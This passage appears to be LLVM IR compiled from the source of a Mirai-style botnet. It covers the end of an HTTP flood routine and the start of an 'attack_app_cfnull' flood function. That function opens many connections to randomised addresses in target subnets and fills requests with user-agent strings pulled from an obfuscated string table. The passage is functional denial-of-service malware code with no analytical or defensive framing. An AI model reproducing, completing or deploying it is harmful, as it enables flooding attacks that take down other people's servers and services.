2281:                                             ; preds = %2276
  %2282 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2283 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2282, i32 0, i32 13
  %2284 = load i32, i32* %2283, align 4
  %2285 = icmp eq i32 %2284, 1
  br i1 %2285, label %2286, label %2342

2286:                                             ; preds = %2281
  %2287 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2288 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2287, i32 0, i32 18
  %2289 = getelementptr inbounds [1024 x i8], [1024 x i8]* %2288, i64 0, i64 0
  %2290 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2291 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2290, i32 0, i32 17
  %2292 = load i32, i32* %2291, align 4
  %2293 = call i32 @util_memsearch(i8* noundef %2289, i32 noundef %2292, i8* noundef getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i64 0, i64 0), i32 noundef 2)
  %2294 = icmp ne i32 %2293, -1
  br i1 %2294, label %2295, label %2341

2295:                                             ; preds = %2286
  %2296 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2297 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2296, i32 0, i32 18
  %2298 = getelementptr inbounds [1024 x i8], [1024 x i8]* %2297, i64 0, i64 0
  %2299 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2300 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2299, i32 0, i32 17
  %2301 = load i32, i32* %2300, align 4
  %2302 = call i32 @util_memsearch(i8* noundef %2298, i32 noundef %2301, i8* noundef getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i64 0, i64 0), i32 noundef 2)
  store i32 %2302, i32* %62, align 4
  %2303 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2304 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2303, i32 0, i32 18
  %2305 = load i32, i32* %62, align 4
  %2306 = sub nsw i32 %2305, 2
  %2307 = sext i32 %2306 to i64
  %2308 = getelementptr inbounds [1024 x i8], [1024 x i8]* %2304, i64 0, i64 %2307
  store i8 0, i8* %2308, align 1
  %2309 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2310 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2309, i32 0, i32 18
  %2311 = getelementptr inbounds [1024 x i8], [1024 x i8]* %2310, i64 0, i64 0
  %2312 = load i32, i32* %62, align 4
  %2313 = call i32 @util_memsearch(i8* noundef %2311, i32 noundef %2312, i8* noundef getelementptr inbounds ([2 x i8], [2 x i8]* @.str.9, i64 0, i64 0), i32 noundef 1)
  %2314 = icmp ne i32 %2313, -1
  br i1 %2314, label %2315, label %2325

2315:                                             ; preds = %2295
  %2316 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2317 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2316, i32 0, i32 18
  %2318 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2319 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2318, i32 0, i32 18
  %2320 = getelementptr inbounds [1024 x i8], [1024 x i8]* %2319, i64 0, i64 0
  %2321 = load i32, i32* %62, align 4
  %2322 = call i32 @util_memsearch(i8* noundef %2320, i32 noundef %2321, i8* noundef getelementptr inbounds ([2 x i8], [2 x i8]* @.str.9, i64 0, i64 0), i32 noundef 1)
  %2323 = sext i32 %2322 to i64
  %2324 = getelementptr inbounds [1024 x i8], [1024 x i8]* %2317, i64 0, i64 %2323
  store i8 0, i8* %2324, align 1
  br label %2325

2325:                                             ; preds = %2315, %2295
  %2326 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2327 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2326, i32 0, i32 18
  %2328 = getelementptr inbounds [1024 x i8], [1024 x i8]* %2327, i64 0, i64 0
  %2329 = call i32 @util_atoi(i8* noundef %2328, i32 noundef 16)
  store i32 %2329, i32* %63, align 4
  %2330 = load i32, i32* %63, align 4
  %2331 = icmp eq i32 %2330, 0
  br i1 %2331, label %2332, label %2335

2332:                                             ; preds = %2325
  %2333 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2334 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2333, i32 0, i32 1
  store i8 1, i8* %2334, align 4
  br label %2396

2335:                                             ; preds = %2325
  %2336 = load i32, i32* %63, align 4
  %2337 = add nsw i32 %2336, 2
  %2338 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2339 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2338, i32 0, i32 14
  store i32 %2337, i32* %2339, align 4
  %2340 = load i32, i32* %62, align 4
  store i32 %2340, i32* %59, align 4
  br label %2341

2341:                                             ; preds = %2335, %2286
  br label %2358

2342:                                             ; preds = %2281
  %2343 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2344 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2343, i32 0, i32 17
  %2345 = load i32, i32* %2344, align 4
  %2346 = load i32, i32* %59, align 4
  %2347 = sub nsw i32 %2345, %2346
  %2348 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2349 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2348, i32 0, i32 14
  store i32 %2347, i32* %2349, align 4
  %2350 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2351 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2350, i32 0, i32 14
  %2352 = load i32, i32* %2351, align 4
  %2353 = icmp eq i32 %2352, 0
  br i1 %2353, label %2354, label %2357

2354:                                             ; preds = %2342
  %2355 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2356 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2355, i32 0, i32 1
  store i8 1, i8* %2356, align 4
  br label %2396

2357:                                             ; preds = %2342
  br label %2358

2358:                                             ; preds = %2357, %2341
  br label %2359

2359:                                             ; preds = %2358, %2276
  %2360 = load i32, i32* %59, align 4
  %2361 = icmp eq i32 %2360, 0
  br i1 %2361, label %2362, label %2363

2362:                                             ; preds = %2359
  br label %2396

2363:                                             ; preds = %2359
  %2364 = load i32, i32* %59, align 4
  %2365 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2366 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2365, i32 0, i32 17
  %2367 = load i32, i32* %2366, align 4
  %2368 = sub nsw i32 %2367, %2364
  store i32 %2368, i32* %2366, align 4
  %2369 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2370 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2369, i32 0, i32 18
  %2371 = getelementptr inbounds [1024 x i8], [1024 x i8]* %2370, i64 0, i64 0
  %2372 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2373 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2372, i32 0, i32 18
  %2374 = getelementptr inbounds [1024 x i8], [1024 x i8]* %2373, i64 0, i64 0
  %2375 = load i32, i32* %59, align 4
  %2376 = sext i32 %2375 to i64
  %2377 = getelementptr inbounds i8, i8* %2374, i64 %2376
  %2378 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2379 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2378, i32 0, i32 17
  %2380 = load i32, i32* %2379, align 4
  %2381 = sext i32 %2380 to i64
  call void @llvm.memmove.p0i8.p0i8.i64(i8* align 4 %2371, i8* align 1 %2377, i64 %2381, i1 false)
  %2382 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2383 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2382, i32 0, i32 18
  %2384 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2385 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2384, i32 0, i32 17
  %2386 = load i32, i32* %2385, align 4
  %2387 = sext i32 %2386 to i64
  %2388 = getelementptr inbounds [1024 x i8], [1024 x i8]* %2383, i64 0, i64 %2387
  store i8 0, i8* %2388, align 1
  %2389 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2390 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2389, i32 0, i32 17
  %2391 = load i32, i32* %2390, align 4
  %2392 = icmp eq i32 %2391, 0
  br i1 %2392, label %2393, label %2394

2393:                                             ; preds = %2363
  br label %2396

2394:                                             ; preds = %2363
  br label %2395

2395:                                             ; preds = %2394
  br label %2100

2396:                                             ; preds = %2393, %2362, %2354, %2332, %2269
  br label %2022

2397:                                             ; preds = %2090, %2028
  br label %2450

2398:                                             ; preds = %2015
  %2399 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2400 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2399, i32 0, i32 1
  %2401 = load i8, i8* %2400, align 4
  %2402 = zext i8 %2401 to i32
  %2403 = icmp eq i32 %2402, 10
  br i1 %2403, label %2404, label %2449

2404:                                             ; preds = %2398
  br label %2405

2405:                                             ; preds = %2438, %2404
  %2406 = call i32* @__errno_location() #7
  store i32 0, i32* %2406, align 4
  %2407 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2408 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2407, i32 0, i32 0
  %2409 = load i32, i32* %2408, align 4
  %2410 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i64 0, i64 0
  %2411 = call i64 @recv(i32 noundef %2409, i8* noundef %2410, i64 noundef 10240, i32 noundef 16384)
  %2412 = trunc i64 %2411 to i32
  store i32 %2412, i32* %12, align 4
  %2413 = load i32, i32* %12, align 4
  %2414 = icmp eq i32 %2413, 0
  br i1 %2414, label %2415, label %2417

2415:                                             ; preds = %2405
  %2416 = call i32* @__errno_location() #7
  store i32 104, i32* %2416, align 4
  store i32 -1, i32* %12, align 4
  br label %2417

2417:                                             ; preds = %2415, %2405
  %2418 = load i32, i32* %12, align 4
  %2419 = icmp eq i32 %2418, -1
  br i1 %2419, label %2420, label %2438

2420:                                             ; preds = %2417
  %2421 = call i32* @__errno_location() #7
  %2422 = load i32, i32* %2421, align 4
  %2423 = icmp ne i32 %2422, 11
  br i1 %2423, label %2424, label %2437

2424:                                             ; preds = %2420
  %2425 = call i32* @__errno_location() #7
  %2426 = load i32, i32* %2425, align 4
  %2427 = icmp ne i32 %2426, 11
  br i1 %2427, label %2428, label %2437

2428:                                             ; preds = %2424
  %2429 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2430 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2429, i32 0, i32 0
  %2431 = load i32, i32* %2430, align 4
  %2432 = call i32 @close(i32 noundef %2431)
  %2433 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2434 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2433, i32 0, i32 0
  store i32 -1, i32* %2434, align 4
  %2435 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2436 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2435, i32 0, i32 1
  store i8 0, i8* %2436, align 4
  br label %2437

2437:                                             ; preds = %2428, %2424, %2420
  br label %2439

2438:                                             ; preds = %2417
  br label %2405

2439:                                             ; preds = %2437
  %2440 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2441 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2440, i32 0, i32 1
  %2442 = load i8, i8* %2441, align 4
  %2443 = zext i8 %2442 to i32
  %2444 = icmp ne i32 %2443, 0
  br i1 %2444, label %2445, label %2448

2445:                                             ; preds = %2439
  %2446 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2447 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2446, i32 0, i32 1
  store i8 1, i8* %2447, align 4
  br label %2448

2448:                                             ; preds = %2445, %2439
  br label %2449

2449:                                             ; preds = %2448, %2398
  br label %2450

2450:                                             ; preds = %2449, %2397
  br label %2451

2451:                                             ; preds = %2450, %2006
  br label %2452

2452:                                             ; preds = %2451, %1029
  br label %2453

2453:                                             ; preds = %2452, %1966, %1635, %1078, %1061, %1019, %987
  %2454 = load i32, i32* %9, align 4
  %2455 = add nsw i32 %2454, 1
  store i32 %2455, i32* %9, align 4
  br label %974, !llvm.loop !20

2456:                                             ; preds = %974
  br label %350

2457:                                             ; preds = %104, %99, %94, %89
  ret void
}

; Function Attrs: argmemonly nofree nounwind willreturn writeonly
declare void @llvm.memset.p0i8.i64(i8* nocapture writeonly, i8, i64, i1 immarg) #1

; Function Attrs: nounwind
declare noalias i8* @calloc(i64 noundef, i64 noundef) #2

; Function Attrs: argmemonly nofree nounwind willreturn
declare void @llvm.memmove.p0i8.p0i8.i64(i8* nocapture writeonly, i8* nocapture readonly, i64, i1 immarg) #3

; Function Attrs: nounwind readnone willreturn
declare i32 @ntohl(i32 noundef) #4

; Function Attrs: nounwind readnone willreturn
declare i32 @htonl(i32 noundef) #4

; Function Attrs: nounwind
declare i64 @time(i64* noundef) #2

declare i32 @close(i32 noundef) #5

; Function Attrs: nounwind
declare i32 @socket(i32 noundef, i32 noundef, i32 noundef) #2

declare i32 @fcntl(i32 noundef, i32 noundef, ...) #5

; Function Attrs: nounwind
declare i32 @setsockopt(i32 noundef, i32 noundef, i32 noundef, i8* noundef, i32 noundef) #2

; Function Attrs: nounwind readnone willreturn
declare zeroext i16 @htons(i16 noundef zeroext) #4

declare i32 @connect(i32 noundef, %struct.sockaddr*, i32 noundef) #5

declare i64 @send(i32 noundef, i8* noundef, i64 noundef, i32 noundef) #5

declare i32 @select(i32 noundef, %struct.fd_set* noundef, %struct.fd_set* noundef, %struct.fd_set* noundef, %struct.timeval* noundef) #5

; Function Attrs: nounwind
declare i32 @getsockopt(i32 noundef, i32 noundef, i32 noundef, i8* noundef, i32* noundef) #2

declare i64 @recv(i32 noundef, i8* noundef, i64 noundef, i32 noundef) #5

declare i32 @sleep(i32 noundef) #5

; Function Attrs: nounwind
declare i8* @strcpy(i8* noundef, i8* noundef) #2

; Function Attrs: nounwind readnone willreturn
declare i32* @__errno_location() #4

; Function Attrs: noinline nounwind sspstrong uwtable
define dso_local void @attack_app_cfnull(i8 noundef zeroext %0, %struct.attack_target* noundef %1, i8 noundef zeroext %2, %struct.attack_option* noundef %3) #0 {
  %5 = alloca i8, align 1
  %6 = alloca %struct.attack_target*, align 8
  %7 = alloca i8, align 1
  %8 = alloca %struct.attack_option*, align 8
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca %struct.attack_cfnull_state*, align 8
  %14 = alloca i8*, align 8
  %15 = alloca i32, align 4
  %16 = alloca [10241 x i8], align 16
  %17 = alloca %struct.fd_set, align 8
  %18 = alloca %struct.fd_set, align 8
  %19 = alloca i32, align 4
  %20 = alloca i32, align 4
  %21 = alloca %struct.timeval, align 8
  %22 = alloca %struct.attack_cfnull_state*, align 8
  %23 = alloca i32, align 4
  %24 = alloca i32, align 4
  %25 = alloca %struct.fd_set*, align 8
  %26 = alloca i32, align 4
  %27 = alloca %struct.fd_set*, align 8
  %28 = alloca %struct.sockaddr_in, align 4
  %29 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  %30 = alloca [10240 x i8], align 16
  %31 = alloca i32, align 4
  %32 = alloca [1025 x i8], align 16
  %33 = alloca [4 x i8], align 1
  %34 = alloca i32, align 4
  %35 = alloca i32, align 4
  store i8 %0, i8* %5, align 1
  store %struct.attack_target* %1, %struct.attack_target** %6, align 8
  store i8 %2, i8* %7, align 1
  store %struct.attack_option* %3, %struct.attack_option** %8, align 8
  store i32 0, i32* %12, align 4
  store %struct.attack_cfnull_state* null, %struct.attack_cfnull_state** %13, align 8
  %36 = load i8, i8* %7, align 1
  %37 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %38 = call i8* @attack_get_opt_str(i8 noundef zeroext %36, %struct.attack_option* noundef %37, i8 noundef zeroext 8, i8* noundef null)
  store i8* %38, i8** %14, align 8
  %39 = load i8, i8* %7, align 1
  %40 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %41 = call i32 @attack_get_opt_int(i8 noundef zeroext %39, %struct.attack_option* noundef %40, i8 noundef zeroext 23, i32 noundef 1)
  store i32 %41, i32* %15, align 4
  %42 = bitcast [10241 x i8]* %16 to i8*
  call void @llvm.memset.p0i8.i64(i8* align 16 %42, i8 0, i64 10241, i1 false)
  %43 = load i8*, i8** %14, align 8
  %44 = icmp eq i8* %43, null
  br i1 %44, label %45, label %46

45:                                               ; preds = %4
  br label %865

46:                                               ; preds = %4
  %47 = load i8*, i8** %14, align 8
  %48 = call i32 @util_strlen(i8* noundef %47)
  %49 = icmp sgt i32 %48, 127
  br i1 %49, label %50, label %51

50:                                               ; preds = %46
  br label %865

51:                                               ; preds = %46
  %52 = load i32, i32* %15, align 4
  %53 = icmp sgt i32 %52, 512
  br i1 %53, label %54, label %55

54:                                               ; preds = %51
  store i32 512, i32* %15, align 4
  br label %55

55:                                               ; preds = %54, %51
  %56 = load i32, i32* %15, align 4
  %57 = sext i32 %56 to i64
  %58 = call noalias i8* @calloc(i64 noundef %57, i64 noundef 668) #6
  %59 = bitcast i8* %58 to %struct.attack_cfnull_state*
  store %struct.attack_cfnull_state* %59, %struct.attack_cfnull_state** %13, align 8
  store i32 0, i32* %9, align 4
  br label %60

60:                                               ; preds = %187, %55
  %61 = load i32, i32* %9, align 4
  %62 = load i32, i32* %15, align 4
  %63 = icmp slt i32 %61, %62
  br i1 %63, label %64, label %190

64:                                               ; preds = %60
  %65 = load %struct.attack_cfnull_state*, %struct.attack_cfnull_state** %13, align 8
  %66 = load i32, i32* %9, align 4
  %67 = sext i32 %66 to i64
  %68 = getelementptr inbounds %struct.attack_cfnull_state, %struct.attack_cfnull_state* %65, i64 %67
  %69 = getelementptr inbounds %struct.attack_cfnull_state, %struct.attack_cfnull_state* %68, i32 0, i32 1
  store i8 0, i8* %69, align 4
  %70 = load %struct.attack_cfnull_state*, %struct.attack_cfnull_state** %13, align 8
  %71 = load i32, i32* %9, align 4
  %72 = sext i32 %71 to i64
  %73 = getelementptr inbounds %struct.attack_cfnull_state, %struct.attack_cfnull_state* %70, i64 %72
  %74 = getelementptr inbounds %struct.attack_cfnull_state, %struct.attack_cfnull_state* %73, i32 0, i32 0
  store i32 -1, i32* %74, align 4
  %75 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %76 = load i32, i32* %9, align 4
  %77 = load i8, i8* %5, align 1
  %78 = zext i8 %77 to i32
  %79 = srem i32 %76, %78
  %80 = sext i32 %79 to i64
  %81 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %75, i64 %80
  %82 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %81, i32 0, i32 1
  %83 = load i32, i32* %82, align 4
  %84 = load %struct.attack_cfnull_state*, %struct.attack_cfnull_state** %13, align 8
  %85 = load i32, i32* %9, align 4
  %86 = sext i32 %85 to i64
  %87 = getelementptr inbounds %struct.attack_cfnull_state, %struct.attack_cfnull_state* %84, i64 %86
  %88 = getelementptr inbounds %struct.attack_cfnull_state, %struct.attack_cfnull_state* %87, i32 0, i32 4
  store i32 %83, i32* %88, align 4
  %89 = load %struct.attack_cfnull_state*, %struct.attack_cfnull_state** %13, align 8
  %90 = load i32, i32* %9, align 4
  %91 = sext i32 %90 to i64
  %92 = getelementptr inbounds %struct.attack_cfnull_state, %struct.attack_cfnull_state* %89, i64 %91
  %93 = getelementptr inbounds %struct.attack_cfnull_state, %struct.attack_cfnull_state* %92, i32 0, i32 6
  %94 = getelementptr inbounds [129 x i8], [129 x i8]* %93, i64 0, i64 0
  %95 = load i8*, i8** %14, align 8
  %96 = call i32 @util_strcpy(i8* noundef %94, i8* noundef %95)
  %97 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %98 = load i32, i32* %9, align 4
  %99 = load i8, i8* %5, align 1
  %100 = zext i8 %99 to i32
  %101 = srem i32 %98, %100
  %102 = sext i32 %101 to i64
  %103 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %97, i64 %102
  %104 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %103, i32 0, i32 2
  %105 = load i8, i8* %104, align 4
  %106 = zext i8 %105 to i32
  %107 = icmp slt i32 %106, 32
  br i1 %107, label %108, label %138

108:                                              ; preds = %64
  %109 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %110 = load i32, i32* %9, align 4
  %111 = load i8, i8* %5, align 1
  %112 = zext i8 %111 to i32
  %113 = srem i32 %110, %112
  %114 = sext i32 %113 to i64
  %115 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %109, i64 %114
  %116 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %115, i32 0, i32 1
  %117 = load i32, i32* %116, align 4
  %118 = call i32 @ntohl(i32 noundef %117) #7
  %119 = call i32 @rand_next()
  %120 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %121 = load i32, i32* %9, align 4
  %122 = load i8, i8* %5, align 1
  %123 = zext i8 %122 to i32
  %124 = srem i32 %121, %123
  %125 = sext i32 %124 to i64
  %126 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %120, i64 %125
  %127 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %126, i32 0, i32 2
  %128 = load i8, i8* %127, align 4
  %129 = zext i8 %128 to i32
  %130 = lshr i32 %119, %129
  %131 = add i32 %118, %130
  %132 = call i32 @htonl(i32 noundef %131) #7
  %133 = load %struct.attack_cfnull_state*, %struct.attack_cfnull_state** %13, align 8
  %134 = load i32, i32* %9, align 4
  %135 = sext i32 %134 to i64
  %136 = getelementptr inbounds %struct.attack_cfnull_state, %struct.attack_cfnull_state* %133, i64 %135
  %137 = getelementptr inbounds %struct.attack_cfnull_state, %struct.attack_cfnull_state* %136, i32 0, i32 4
  store i32 %132, i32* %137, align 4
  br label %138

138:                                              ; preds = %108, %64
  %139 = call i32 @rand_next()
  %140 = urem i32 %139, 5
  switch i32 %140, label %186 [
    i32 0, label %141
    i32 1, label %150
    i32 2, label %159
    i32 3, label %168
    i32 4, label %177
  ]

141:                                              ; preds = %138
  call void @table_unlock_val(i8 noundef zeroext 54)
  %142 = load %struct.attack_cfnull_state*, %struct.attack_cfnull_state** %13, align 8
  %143 = load i32, i32* %9, align 4
  %144 = sext i32 %143 to i64
  %145 = getelementptr inbounds %struct.attack_cfnull_state, %struct.attack_cfnull_state* %142, i64 %144
  %146 = getelementptr inbounds %struct.attack_cfnull_state, %struct.attack_cfnull_state* %145, i32 0, i32 5
  %147 = getelementptr inbounds [512 x i8], [512 x i8]* %146, i64 0, i64 0
  %148 = call i8* @table_retrieve_val(i32 noundef 54, i32* noundef null)
  %149 = call i32 @util_strcpy(i8* noundef %147, i8* noundef %148)
  call void @table_lock_val(i8 noundef zeroext 54)
  br label %186

150:                                              ; preds = %138
  call void @table_unlock_val(i8 noundef zeroext 55)
  %151 = load %struct.attack_cfnull_state*, %struct.attack_cfnull_state** %13, align 8
  %152 = load i32, i32* %9, align 4
  %153 = sext i32 %152 to i64
  %154 = getelementptr inbounds %struct.attack_cfnull_state, %struct.attack_cfnull_state* %151, i64 %153
  %155 = getelementptr inbounds %struct.attack_cfnull_state, %struct.attack_cfnull_state* %154, i32 0, i32 5
  %156 = getelementptr inbounds [512 x i8], [512 x i8]* %155, i64 0, i64 0
  %157 = call i8* @table_retrieve_val(i32 noundef 55, i32* noundef null)
  %158 = call i32 @util_strcpy(i8* noundef %156, i8* noundef %157)
  call void @table_lock_val(i8 noundef zeroext 55)
  br label %186

159:                                              ; preds = %138
  call void @table_unlock_val(i8 noundef zeroext 56)
  %160 = load %struct.attack_cfnull_state*, %struct.attack_cfnull_state** %13, align 8
  %161 = load i32, i32* %9, align 4
  %162 = sext i32 %161 to i64
  %163 = getelementptr inbounds %struct.attack_cfnull_state, %struct.attack_cfnull_state* %160, i64 %162
  %164 = getelementptr inbounds %struct.attack_cfnull_state, %struct.attack_cfnull_state* %163, i32 0, i32 5
  %165 = getelementptr inbounds [512 x i8], [512 x i8]* %164, i64 0, i64 0
  %166 = call i8* @table_retrieve_val(i32 noundef 56, i32* noundef null)
  %167 = call i32 @util_strcpy(i8* noundef %165, i8* noundef %166)
  call void @table_lock_val(i8 noundef zeroext 56)
  br label %186

168:                                              ; preds = %138
  call void @table_unlock_val(i8 noundef zeroext 57)
  %169 = load %struct.attack_cfnull_state*, %struct.attack_cfnull_state** %13, align 8
  %170 = load i32, i32* %9, align 4
  %171 = sext i32 %170 to i64
  %172 = getelementptr inbounds %struct.attack_cfnull_state, %struct.attack_cfnull_state* %169, i64 %171
  %173 = getelementptr inbounds %struct.attack_cfnull_state, %struct.attack_cfnull_state* %172, i32 0, i32 5
  %174 = getelementptr inbounds [512 x i8], [512 x i8]* %173, i64 0, i64 0
  %175 = call i8* @table_retrieve_val(i32 noundef 57, i32* noundef null)
  %176 = call i32 @util_strcpy(i8* noundef %174, i8* noundef %175)
  call void @table_lock_val(i8 noundef zeroext 57)
  br label %186

177:                                              ; preds = %138
  call void @table_unlock_val(i8 noundef zeroext 58)
  %178 = load %struct.attack_cfnull_state*, %struct.attack_cfnull_state** %13, align 8
  %179 = load i32, i32* %9, align 4
  %180 = sext i32 %179 to i64
  %181 = getelementptr inbounds %struct.attack_cfnull_state, %struct.attack_cfnull_state* %178, i64 %180
  %182 = getelementptr inbounds %struct.attack_cfnull_state, %struct.attack_cfnull_state* %181, i32 0, i32 5
  %183 = getelementptr inbounds [512 x i8], [512 x i8]* %182, i64 0, i64 0
  %184 = call i8* @table_retrieve_val(i32 noundef 58, i32* noundef null)
  %185 = call i32 @util_strcpy(i8* noundef %183, i8* noundef %184)
  call void @table_lock_val(i8 noundef zeroext 58)
  br label %186

186:                                              ; preds = %177, %168, %159, %150, %141, %138
  br label %187

187:                                              ; preds = %186
  %188 = load i32, i32* %9, align 4
  %189 = add nsw i32 %188, 1
  store i32 %189, i32* %9, align 4
  br label %60, !llvm.loop !21

190:                                              ; preds = %60
  br label %191

191:                                              ; preds = %864, %766, %756, %190
  store i32 0, i32* %19, align 4
  %192 = call i64 @time(i64* noundef null) #6
  %193 = trunc i64 %192 to i32
  store i32 %193, i32* %23, align 4
  br label %194

194:                                              ; preds = %191
  store %struct.fd_set* %17, %struct.fd_set** %25, align 8
  store i32 0, i32* %24, align 4
  br label %195

195:                                              ; preds = %205, %194
  %196 = load i32, i32* %24, align 4
  %197 = zext i32 %196 to i64
  %198 = icmp ult i64 %197, 16
  br i1 %198, label %199, label %208

199:                                              ; preds = %195
  %200 = load %struct.fd_set*, %struct.fd_set** %25, align 8
  %201 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %200, i32 0, i32 0
  %202 = load i32, i32* %24, align 4
  %203 = zext i32 %202 to i64
  %204 = getelementptr inbounds [16 x i64], [16 x i64]* %201, i64 0, i64 %203
  store i64 0, i64* %204, align 8
  br label %205

205:                                              ; preds = %199
  %206 = load i32, i32* %24, align 4
  %207 = add i32 %206, 1
  store i32 %207, i32* %24, align 4
  br label %195, !llvm.loop !22

208:                                              ; preds = %195
  br label %209

209:                                              ; preds = %208
  br label %210

210:                                              ; preds = %209
  store %struct.fd_set* %18, %struct.fd_set** %27, align 8
  store i32 0, i32* %26, align 4
  br label %211

211:                                              ; preds = %221, %210
  %212 = load i32, i32* %26, align 4
  %213 = zext i32 %212 to i64
  %214 = icmp ult i64 %213, 16
  br i1 %214, label %215, label %224

215:                                              ; preds = %211
  %216 = load %struct.fd_set*, %struct.fd_set** %27, align 8
  %217 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %216, i32 0, i32 0
  %218 = load i32, i32* %26, align 4
  %219 = zext i32 %218 to i64
  %220 = getelementptr inbounds [16 x i64], [16 x i64]* %217, i64 0, i64 %219
  store i64 0, i64* %220, align 8
  br label %221

221:                                              ; preds = %215
  %222 = load i32, i32* %26, align 4
  %223 = add i32 %222, 1
  store i32 %223, i32* %26, align 4
  br label %211, !llvm.loop !23

224:                                              ; preds = %211
  br label %225

225:                                              ; preds = %224
  store i32 0, i32* %9, align 4
  br label %226

226:                                              ; preds = %750, %225
  %227 = load i32, i32* %9, align 4
  %228 = load i32, i32* %15, align 4
  %229 = icmp slt i32 %227, %228
  br i1 %229, label %230, label %753

230:                                              ; preds = %226
  %231 = load %struct.attack_cfnull_state*, %struct.attack_cfnull_state** %13, align 8
  %232 = load i32, i32* %9, align 4
  %233 = sext i32 %232 to i64
  %234 = getelementptr inbounds %struct.attack_cfnull_state, %struct.attack_cfnull_state* %231, i64 %233
  store %struct.attack_cfnull_state* %234, %struct.attack_cfnull_state** %22, align 8
  %235 = load %struct.attack_cfnull_state*, %struct.attack_cfnull_state** %22, align 8
  %236 = getelementptr inbounds %struct.attack_cfnull_state, %struct.attack_cfnull_state* %235, i32 0, i32 1
  %237 = load i8, i8* %236, align 4
  %238 = zext i8 %237 to i32
  %239 = icmp eq i32 %238, 1
  br i1 %239, label %240, label %243

240:                                              ; preds = %230
  %241 = load %struct.attack_cfnull_state*, %struct.attack_cfnull_state** %22, align 8
  %242 = getelementptr inbounds %struct.attack_cfnull_state, %struct.attack_cfnull_state* %241, i32 0, i32 1
  store i8 0, i8* %242, align 4
  br label %243

243:                                              ; preds = %240, %230
